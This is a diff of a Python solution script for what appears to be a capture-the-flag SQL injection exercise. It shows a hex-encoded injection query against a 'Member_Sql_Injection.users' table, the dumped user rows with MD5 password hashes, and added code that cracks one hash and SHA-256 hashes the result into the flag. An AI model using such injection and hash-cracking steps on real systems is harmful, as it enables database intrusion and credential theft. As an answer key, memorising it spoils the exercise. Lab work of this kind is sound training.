@@ -8,6 +8,7 @@
 import requests
 from bs4 import BeautifulSoup
 import sys
+import hashlib
 
 # HELPER FUNCTIONS -----------------------------------------------------------------------------------------------------
 """
@@ -99,22 +100,6 @@ query = (
         + to_hex(")")
         + ") FROM Member_Sql_Injection.users"
 )
-# result: ("user_id: 1","first_name: one","last_name: me","town: Paris ","country: France","planet: EARTH","Commentaire: Je pense, donc je suis","countersign: 2b3366bcfd44f540e630d4dc2b9b06d9"),("user_id: 2","first_name: two","last_name: me","town: Helsinki","country: Finlande","planet: Earth","Commentaire: Aamu on iltaa viisaampi.","countersign: 60e9032c586fb422e2c16dee6286cf10"),("user_id: 3","first_name: three","last_name: me","town: Dublin","country: Irlande","planet: Earth","Commentaire: Dublin is a city of stories and secrets.","countersign: e083b24a01c483437bcf4a9eea7c1b4d"),("user_id: 5","first_name: Flag","last_name: GetThe","town: 42","country: 42","planet: 42","Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !","countersign: 5ff9d0165b4f92b14994e5c685cdce28")
-query_result = [
-    ("user_id: 1", "first_name: one", "last_name: me", "town: Paris ", "country: France", "planet: EARTH",
-     "Commentaire: Je pense, donc je suis", "countersign: 2b3366bcfd44f540e630d4dc2b9b06d9"),
-    ("user_id: 2", "first_name: two", "last_name: me", "town: Helsinki", "country: Finlande", "planet: Earth",
-     "Commentaire: Aamu on iltaa viisaampi.", "countersign: 60e9032c586fb422e2c16dee6286cf10"),
-    ("user_id: 3", "first_name: three", "last_name: me", "town: Dublin", "country: Irlande", "planet: Earth",
-     "Commentaire: Dublin is a city of stories and secrets.", "countersign: e083b24a01c483437bcf4a9eea7c1b4d"),
-    ("user_id: 5", "first_name: Flag", "last_name: GetThe", "town: 42", "country: 42", "planet: 42",
-     "Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !",
-     "countersign: 5ff9d0165b4f92b14994e5c685cdce28")
-]
-
-# COUNTERSIGN OF LAST ELEMENT: 5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo
-# fortytwo encrypted with sha256 -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
-
 
 # a list of columns indexes to show. 0 - first column, 1 - second column. These are the only options for now.
 SHOW_N_COLUMNS = [0, 1]
@@ -181,3 +166,27 @@ else:
     for i, item in enumerate(formatted_results):
         for j in SHOW_N_COLUMNS:
             print(f"{item[j]}")
+
+# result: ("user_id: 1","first_name: one","last_name: me","town: Paris ","country: France","planet: EARTH","Commentaire: Je pense, donc je suis","countersign: 2b3366bcfd44f540e630d4dc2b9b06d9"),("user_id: 2","first_name: two","last_name: me","town: Helsinki","country: Finlande","planet: Earth","Commentaire: Aamu on iltaa viisaampi.","countersign: 60e9032c586fb422e2c16dee6286cf10"),("user_id: 3","first_name: three","last_name: me","town: Dublin","country: Irlande","planet: Earth","Commentaire: Dublin is a city of stories and secrets.","countersign: e083b24a01c483437bcf4a9eea7c1b4d"),("user_id: 5","first_name: Flag","last_name: GetThe","town: 42","country: 42","planet: 42","Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !","countersign: 5ff9d0165b4f92b14994e5c685cdce28")
+query_result = [
+    ("user_id: 1", "first_name: one", "last_name: me", "town: Paris ", "country: France", "planet: EARTH",
+     "Commentaire: Je pense, donc je suis", "countersign: 2b3366bcfd44f540e630d4dc2b9b06d9"),
+    ("user_id: 2", "first_name: two", "last_name: me", "town: Helsinki", "country: Finlande", "planet: Earth",
+     "Commentaire: Aamu on iltaa viisaampi.", "countersign: 60e9032c586fb422e2c16dee6286cf10"),
+    ("user_id: 3", "first_name: three", "last_name: me", "town: Dublin", "country: Irlande", "planet: Earth",
+     "Commentaire: Dublin is a city of stories and secrets.", "countersign: e083b24a01c483437bcf4a9eea7c1b4d"),
+    ("user_id: 5", "first_name: Flag", "last_name: GetThe", "town: 42", "country: 42", "planet: 42",
+     "Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !",
+     "countersign: 5ff9d0165b4f92b14994e5c685cdce28")
+]
+
+last_result = query_result[-1]
+countersign = last_result[-1]
+# COUNTERSIGN OF LAST ELEMENT: 5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo (https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28)
+decrypted_countersign = "FortyTwo"
+
+lowered_countersign = decrypted_countersign.lower()
+sha256_hash = hashlib.sha256(lowered_countersign.encode()).hexdigest()
+# fortytwo encrypted with sha256 -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+print(f"[sha256_hash] RESULT: {sha256_hash}")  # 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
